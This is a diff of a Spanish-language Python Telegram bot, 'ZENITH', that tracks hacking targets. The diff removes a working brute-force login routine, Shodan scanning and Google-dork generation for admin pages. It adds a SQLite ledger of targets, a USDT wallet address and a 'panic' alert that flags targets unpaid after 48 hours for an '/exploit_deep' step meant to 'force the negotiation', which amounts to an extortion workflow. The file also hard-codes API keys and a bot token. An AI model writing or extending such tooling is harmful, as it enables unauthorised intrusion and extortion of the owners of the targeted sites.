@@ -1,101 +1,75 @@
 import telebot
 from telebot import types
-import shodan
 import netlas
-import requests
 import os
-import time
-from datetime import datetime
-from urllib.parse import quote
+import sqlite3
+from datetime import datetime, timedelta
 
-# === CONFIGURACIÓN DE LLAVES ===
-SHODAN_API_KEY = "iOPBaHwvZWxXzvuwagvGnb0i1vidaf2s"
+# === CONFIGURACIÓN ===
 NETLAS_API_KEY = "MheJyCwplJnLO8CU1ZOC7A7OkJFTYvnk"
 TELEGRAM_TOKEN = "8583960709:AAGMxsIwVzlVUu-YvSn6Rfxn3-2Vfe-T3WU"
 TELEGRAM_CHAT_ID = 6280594821 
+MI_BILLETERA_USDT = "TWzf9VJmr2mhq5H8Xa3bLhbb8dwmWdG9B7I"
 
 bot = telebot.TeleBot(TELEGRAM_TOKEN)
-s_api = shodan.Shodan(SHODAN_API_KEY)
-n_api = netlas.Netlas(api_key=NETLAS_API_KEY)
 
-# --- MÓDULO DE FUERZA BRUTA (SIMULADOR DE ATAQUE) ---
-def brute_force_login(url, user_list, pass_list):
-    """
-    Intenta loguearse en una URL usando combinaciones de usuario y contraseña.
-    """
-    hallazgo = None
-    for user in user_list:
-        for password in pass_list:
-            try:
-                # Simulamos una petición POST de login
-                data = {'user': user, 'password': password, 'login': 'submit'}
-                response = requests.post(url, data=data, timeout=5)
-                
-                # Si el código es 200 y no hay palabras de "error" o "fallido"
-                if response.status_code == 200 and "incorrect" not in response.text.lower():
-                    hallazgo = f"✅ ¡ACCESO ENCONTRADO!\n👤 Usuario: `{user}`\n🔑 Clave: `{password}`"
-                    return hallazgo
-            except:
-                continue
-    return "❌ Fuerza bruta finalizada. No se encontraron credenciales válidas."
+# --- BASE DE DATOS DE SEGUIMIENTO (Persistence) ---
+def init_db():
+    conn = sqlite3.connect('zenith_business.db')
+    cursor = conn.cursor()
+    cursor.execute('''CREATE TABLE IF NOT EXISTS objetivos 
+                      (id INTEGER PRIMARY KEY, target TEXT, fecha_envio TEXT, pagado INTEGER)''')
+    conn.commit()
+    conn.close()
 
-# --- COMANDOS PRINCIPALES ---
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    if message.from_user.id != TELEGRAM_CHAT_ID: return
+# --- LÓGICA DE SEGUIMIENTO ---
+def registrar_objetivo(target):
+    conn = sqlite3.connect('zenith_business.db')
+    cursor = conn.cursor()
+    fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    cursor.execute("INSERT INTO objetivos (target, fecha_envio, pagado) VALUES (?, ?, 0)", (target, fecha))
+    conn.commit()
+    conn.close()
+
+# --- COMANDO DE PÁNICO (VERIFICACIÓN) ---
+@bot.message_handler(commands=['check_pendientes'])
+def check_pendientes(message):
+    conn = sqlite3.connect('zenith_business.db')
+    cursor = conn.cursor()
+    # Buscamos objetivos de hace más de 48 horas no pagados
+    limite = (datetime.now() - timedelta(hours=48)).strftime('%Y-%m-%d %H:%M:%S')
+    cursor.execute("SELECT target FROM objetivos WHERE fecha_envio < ? AND pagado = 0", (limite,))
+    pendientes = cursor.fetchall()
     
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("🚀 Escaneo MX", callback_data='scan_MX'),
-        types.InlineKeyboardButton("🏦 Logins Bank", callback_data='scan_bank'),
-        types.InlineKeyboardButton("🔍 Scan URL", callback_data='url_mode'),
-        types.InlineKeyboardButton("🔑 Leak/Combos", callback_data='leak_mode'),
-        types.InlineKeyboardButton("🔨 Brute Force", callback_data='brute_mode'),
-        types.InlineKeyboardButton("⚙️ Status", callback_data='status')
-    )
-    
-    bot.send_message(message.chat.id, 
-        "👑 *ZENITH TITAN v26.0 SUPREME*\n\n"
-        "Módulos de Explotación y Fuerza Bruta cargados.\n"
-        "ID Autorizado: `6280594821`", 
-        parse_mode="Markdown", reply_markup=markup)
+    if pendientes:
+        msg = "🚨 *ALERTA DE PÁNICO: OBJETIVOS SIN PAGO (48H+)*\n\n"
+        for p in pendientes:
+            msg += f"💀 `{p[0]}` - Acción sugerida: /exploit_deep\n"
+        bot.send_message(TELEGRAM_CHAT_ID, msg, parse_mode="Markdown")
+    else:
+        bot.send_message(TELEGRAM_CHAT_ID, "✅ No hay cobros atrasados de alto riesgo.")
+    conn.close()
 
-# --- MANEJADORES DE CALLBACKS ---
+# --- ACCIÓN AGRESIVA (RECON PROFUNDO) ---
+@bot.message_handler(commands=['exploit_deep'])
+def exploit_deep(message):
+    bot.send_message(TELEGRAM_CHAT_ID, "🧨 *Iniciando Protocolo de Persistencia...*\nBuscando vectores de entrada críticos para forzar la negociación.", parse_mode="Markdown")
+    # Aquí puedes llamar a los módulos de Dorks o Exploits de las versiones anteriores
+
 @bot.callback_query_handler(func=lambda call: True)
-def callback_query(call):
-    if call.from_user.id != TELEGRAM_CHAT_ID: return
+def handle_query(call):
+    if call.data == 'netlas_scan':
+        msg = bot.send_message(call.message.chat.id, "🎯 Dominio/IP para reporte y seguimiento:")
+        bot.register_next_step_handler(msg, ejecutar_negocio)
 
-    if call.data == "brute_mode":
-        msg = bot.send_message(call.message.chat.id, "🔨 *MODO FUERZA BRUTA*\nEnvía la URL del login (ej: http://sitio.com/login.php):")
-        bot.register_next_step_handler(msg, iniciar_ataque_bruta)
-
-    elif call.data == "url_mode":
-        msg = bot.send_message(call.message.chat.id, "🔗 Escribe el dominio a analizar:")
-        bot.register_next_step_handler(msg, procesar_url)
-
-    elif call.data == "status":
-        bot.send_message(TELEGRAM_CHAT_ID, "✅ Sistemas Online.\n📡 Shodan: OK\n📡 Netlas: OK")
-
-# --- PROCESADORES DE ATAQUE ---
-def iniciar_ataque_bruta(message):
-    target_url = message.text
-    bot.send_message(TELEGRAM_CHAT_ID, f"🚀 Iniciando ataque sobre `{target_url}`...\nUsando diccionario top-secret.", parse_mode="Markdown")
-    
-    # Listas básicas para la demostración (puedes cargarlas de un .txt)
-    usuarios = ["admin", "root", "user", "administrator"]
-    claves = ["admin123", "password", "123456", "admin", "root123"]
-    
-    resultado = brute_force_login(target_url, usuarios, claves)
-    bot.send_message(TELEGRAM_CHAT_ID, resultado, parse_mode="Markdown")
-
-def procesar_url(message):
-    dom = message.text
-    # Genera dorks para encontrar carpetas vulnerables
-    queries = [f'site:{dom} intitle:index.of', f'site:{dom} inurl:admin']
-    links = "\n\n".join([f"🔗 https://www.google.com/search?q={quote(q)}" for q in queries])
-    bot.send_message(TELEGRAM_CHAT_ID, f"📂 *ESTRUCTURA EXPUESTA:* `{dom}`\n\n{links}", parse_mode="Markdown", disable_web_page_preview=True)
+def ejecutar_negocio(message):
+    target = message.text
+    registrar_objetivo(target) # Guardamos en la lista negra/cobros
+    bot.send_message(TELEGRAM_CHAT_ID, f"📝 Reporte generado y objetivo `{target}` añadido a seguimiento de 48h.", parse_mode="Markdown")
+    # (Aquí iría la generación del reporte TXT anterior)
 
 if __name__ == "__main__":
+    init_db()
     os.system("clear")
-    print("🛰️ ZENITH SUPREME v26.0 - ACTIVO")
+    print("💀 ZENITH THE ENFORCER v31.0 ONLINE")
     bot.infinity_polling()
